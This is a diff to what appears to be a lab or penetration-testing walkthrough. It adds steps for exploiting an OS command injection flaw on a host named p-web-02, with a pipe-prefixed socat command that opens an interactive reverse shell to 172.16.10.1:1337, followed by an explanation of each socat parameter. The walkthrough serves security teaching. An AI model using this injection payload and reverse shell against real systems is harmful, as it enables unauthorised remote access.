@@ -67,3 +67,18 @@ socat file:$(tty),raw,echo=0 tcp-listen:1337
 
 <br>
 <br>
+
+Next, by using the previously identified OS Command Injection vulnerability on *p-web-02* (172.16.10.12), execute the following command:<br>
+> Note the use of the pipe (`|`) character to trigger the vulnerability.
+```
+|socat exec:'bash -li',pty,stderr tcp:172.16.10.1:1337
+```
+
+- We call socat using the `exec:` [address type](https://www.man7.org/linux/man-pages/man1/socat.1.html#ADDRESS_TYPES), which forks a sub-process that establishes communication with its parent process (i.e., run a program interactively and bidirectionally).
+	- NOTE: socat's `EXEC:<command-line-program>` Address Type can accept multiple arguments separated by single spaces or commas.
+- Pass `exec:` a parameter of `'bash -li'`, which will execute bash interactively as if it had been invoked as a login shell.
+- Pass `exec:` a second parameter of `pty` to generate a pseudo-terminal.
+- Pass `exec:` a third parameter of `stderr` to capture the standard error stream.
+- Finally, `tcp:172.16.10.1:1337` sets the connection address using the `TCP:<host>:<port>` Address Type.
+
+
